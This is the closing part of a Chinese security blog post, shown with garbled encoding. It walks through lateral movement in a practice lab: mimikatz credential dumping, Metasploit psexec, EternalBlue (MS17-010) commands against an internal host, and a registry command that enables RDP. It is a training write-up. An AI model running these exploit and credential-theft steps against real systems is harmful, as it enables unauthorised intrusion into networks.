<h3 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h3><h4 id="mimikatzæŠ“å–å¯†ç "><a href="#mimikatzæŠ“å–å¯†ç " class="headerlink" title="mimikatzæŠ“å–å¯†ç "></a>mimikatzæŠ“å–å¯†ç </h4><p>ç”¨mimikatzæŠ“å–å¯†ç ï¼ˆmsfä¹Ÿå°±æ˜¯kiwiæ¨¡å—ï¼‰è¿™é‡Œç›´æ¥å¾—åˆ°äº†å½“å‰æœºå™¨ç”¨æˆ·çš„å¯†ç ï¼šhongrisec@2019</p>
<img src="/2022/05/09/22-0509-01/image-20220510234532382.png" alt="image-20220510234532382" style="zoom:80%;">

<h4 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h4><p>ä¸Šé¢å‘ç°äº†<code>192.168.52.138</code>ã€<code>192.168.52.141</code>ä¸¤å°ä¸»æœºï¼Œå¦å¤–è¿˜å¾—åˆ°äº†å½“å‰å†…ç½‘ä¸»æœºçš„å¯†ç ï¼Œå°è¯•åˆ©ç”¨psexecè¿›è¡Œæ¨ªå‘ç§»åŠ¨ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥åˆ©ç”¨æ°¸æ’ä¹‹è“ï¼Œè¿™é‡Œä½¿ç”¨psexec</p>
<p>ä½¿ç”¨<code>use exploit/windows/smb/psexec</code></p>
<img src="/2022/05/09/22-0509-01/image-20220511124335193.png" alt="image-20220511124335193" style="zoom:80%;">

<p>

<img src="/2022/05/09/22-0509-01/image-20220511124410937.png" alt="image-20220511124410937" style="zoom:80%;">

</p><p>

<img src="/2022/05/09/22-0509-01/image-20220511124434083.png" alt="image-20220511124434083" style="zoom:80%;">

</p><p>

<img src="/2022/05/09/22-0509-01/image-20220511124508610.png" alt="image-20220511124508610" style="zoom:80%;">

</p><p>ä¸€é¡¿æ“ä½œä¸‹æ¥ï¼Œåˆ©ç”¨å¤±è´¥äº†ã€‚ã€‚ã€‚ã€‚ã€‚ï¼ˆæ²¡ææ¸…æ¥šå•¥åŸå› ï¼‰</p>
<p>ç«Ÿç„¶è¿™æ ·ï¼Œé‚£ä¹ˆåˆ©ç”¨æ°¸æ’ä¹‹è“</p>
<h4 id="ms-17-010"><a href="#ms-17-010" class="headerlink" title="ms-17-010"></a>ms-17-010</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<img src="/2022/05/09/22-0509-01/image-20220512144508863.png" alt="image-20220512144508863" style="zoom:80%;">

<p>FAILäº†ä¸¤æ¬¡ï¼Œç¬¬ä¸‰æ¬¡æˆåŠŸäº†</p>
<img src="/2022/05/09/22-0509-01/image-20220512144602732.png" alt="image-20220512144602732" style="zoom:80%;">

<p>è¿™é‡Œæ°¸æ’ä¹‹è“åˆ©ç”¨æˆåŠŸä¹‹åï¼Œè¿›è¡Œå¯ä»¥è¿›å…¥shellä¸­æ‰“å¼€3389ç«¯å£ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤æ‰“å¼€3389ç«¯å£</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼šè¿™é‡Œæå‰æ‰‹åŠ¨æŠŠåŸŸæ§çš„é˜²ç«å¢™å…³é—­ä¹‹åï¼Œæ°¸æ’ä¹‹è“æ‰åˆ©ç”¨æˆåŠŸçš„ï¼Œå®é™…æ²¡å•¥ç”¨ï¼Œä¸€èˆ¬é˜²ç«å¢™éƒ½æ˜¯å¼€æ”¾çš„ã€‚ã€‚ã€‚è¿™é‡Œç”¨çš„payloadæ˜¯æ­£å‘è¿æ¥åˆ°åŸŸæ§<code>windows/x64/meterpreter/bind_tcp</code>ï¼Œå› ä¸ºkaliçš„msfè®¾ç½®äº†é™æ€è·¯ç”±ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è®¿é—®åˆ°åŸŸæ§ï¼Œä½†æ˜¯ç”±äºåŸŸæ§å¼€å¯äº†é˜²ç«å¢™æ‰€ä»¥æ­£å‘payloadè‚¯å®šä¼šè¢«æ‹¦æˆªçš„ã€‚ã€‚ã€‚è¿™é‡Œå¦‚æœå°è¯•æ¢æˆåå‘è¿æ¥ç»•è¿‡é˜²ç«å¢™ï¼Œä½¿ç”¨<code>payload/windows/x64/meterpreter/reverse_tcp </code>ï¼Œå…³é—­äº†é˜²ç«å¢™ä¹Ÿä¼šå¤±è´¥ã€‚ã€‚ã€‚ï¼ˆæ²¡ææ‡‚ï¼‰ï¼Œè¿™é‡Œæ°¸æ’ä¹‹è“çš„åˆ©ç”¨å¾ˆç„å­¦ï¼Œæœ‰çš„æ—¶å€™å…¨éƒ¨é˜²ç«å¢™å…³é—­åï¼Œåˆ©ç”¨åŠå¤©ä¹Ÿä¸è¡Œã€‚ã€‚ã€‚</p>
<p>å¦‚æœåˆ©ç”¨ä¸æˆåŠŸçš„è¯ï¼Œå°è¯•ç”¨win7å’ŒåŸŸæ§å»ºç«‹åŒ¿åè¿æ¥ï¼Œç„¶åå†æ¬¡å°è¯•ï¼Œèšå‰‘ä¸­æ‰§è¡Œ<code>net use \\192.168.52.138</code>å»ºç«‹åŒ¿åè¿æ¥</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/issues/11691">https://github.com/rapid7/metasploit-framework/issues/11691</a></p>
<img src="/2022/05/09/22-0509-01/image-20220512150927204.png" alt="image-20220512150927204" style="zoom:80%;">

<h1 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h1><p>è¯¥é¶åœºéš¾åº¦ç›¸å¯¹ç®€å•ï¼Œä½†æ˜¯æ€»ä¼šé‡åˆ°å„ç§é—®é¢˜ï¼Œç‰¹åˆ«æ˜¯åœ¨å†…ç½‘ç¯å¢ƒä¸­ï¼Œå„ç§æŠ¥é”™ï¼Œå„ç§è¸©å‘ï¼Œproxychainsä»£ç†msfä¸€ç›´æ— æ³•æˆåŠŸï¼Œæ„Ÿè§‰æœ‰ç‚¹å¥‡æ€ªã€‚ã€‚ã€‚ã€‚é™¤äº†ä¸Šé¢çš„æ–¹æ³•å¤–ï¼Œè¯¥é¶åœºä¸­æ¨ªå‘ç§»åŠ¨çš„æ–¹æ³•è¿˜æœ‰å¥½å¤šï¼Œvmiï¼Œå“ˆå¸Œä¼ é€’ç­‰åº”è¯¥éƒ½å¯ä»¥ã€‚</p>

        </div>		
		
        <section class="post-tags">
            <div>
                <span>æ ‡ç­¾:</span>
                <span class="tag">
                    
                </span>
            </div>
            <div>
                <a href="/">
                    <i class="iconfont icon-home"></i>
                    ä¸»é¡µ
                </a>
                <span>Â· </span>
                <a href="javascript:window.history.back();">
                    <i class="iconfont icon-back"></i>
                    è¿”å›
                </a>
                
                
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2022/05/10/22-0510-01/">ä¸­é—´ä»¶æ¼æ´</a>
            
            
            <a class="next" rel="next" href="/2022/05/07/22-0507-02/">åšå®¢å¤šä½™å›¾ç‰‡å¤„ç†</a>
            
        </section>
        <br>
        
            <section id="comments" class="comments">
              <style>
                  .comments{ margin-top: 30px;}
                  .v .vlist .vcard .vcontent {padding-top: 0;}
                  .vcontent p { color:grey; margin-bottom: 10px;}
                  .v * {line-height: normal;}
                  .v .vwrap  {border-radius: 0px; padding: 10px;}
                  .v .vbtn {border-radius: 0px;}
                  .v code, .v pre {border-radius: 0px;}
                  .v .vlist .vcard .vhead .vsys {border-radius: 1px; padding: 2px;}
                  .v .vlist .vcard .vhead .vnick {color: #2d96bd;}
                  .v .vlist .vcard .vh .vmeta .vat{color: #c7254e;}
                  .v .vlist .vcard {padding-top: 0;}
                  .v .vlist .vcard .vimg { width: 2.5em; height: 2.5em; }
                  .v .vlist .vcard .vquote .vimg { width: 2.5em; height: 2.5em; }
              </style>
              <div class="valine_comment"></div>
<!--è½½å…¥jsï¼Œåœ¨</body>ä¹‹å‰æ’å…¥å³å¯-->
<!--Leancloud æ“ä½œåº“:-->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<!--Valine çš„æ ¸å¿ƒä»£ç åº“-->
<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
<script>
    new Valine({
        app_id: 'baahrwTTyOayDYUv5AtkdGJj-gzGzoHsz',
        app_key: 'iTfzn8X60g9v0zTtnvToc09l',
        placeholder: 'æƒ³å¯¹ä½œè€…è¯´ç‚¹ä»€ä¹ˆ...',
        notify: 'false',
        verify: 'false',
        avatar: 'retro',
        visitor: 'true'
    });
</script>
            </section>
        
    </article>
</div>



<style>

.post-wrap { table-layout:fixed; word-break:break-all; overflow:hidden; }

</style>
        </div>
        <footer id="footer" class="footer">

 <div class="copyright">

 <span>Â© ğ´_ğ‘Œğ‘¢

 <!-- è®¿å®¢æ•°é‡ -->

 

 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<span class="site-uv">
    | æ€»è®¿å®¢é‡:
    <i class="busuanzi-value" id="busuanzi_value_site_uv"><i class="fa fa-spinner fa-spin"></i></i>
</span>&nbsp;


<span class="site-pv">
    | æ€»è®¿é—®é‡:
    <i class="busuanzi-value" id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></i>
</span>


 

 </span>

 </div>

</footer>
    </div>
</body>
</html>


<!--åŠ¨æ€çº¿æ¡èƒŒæ™¯-->
<script type="text/javascript"
color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
</script>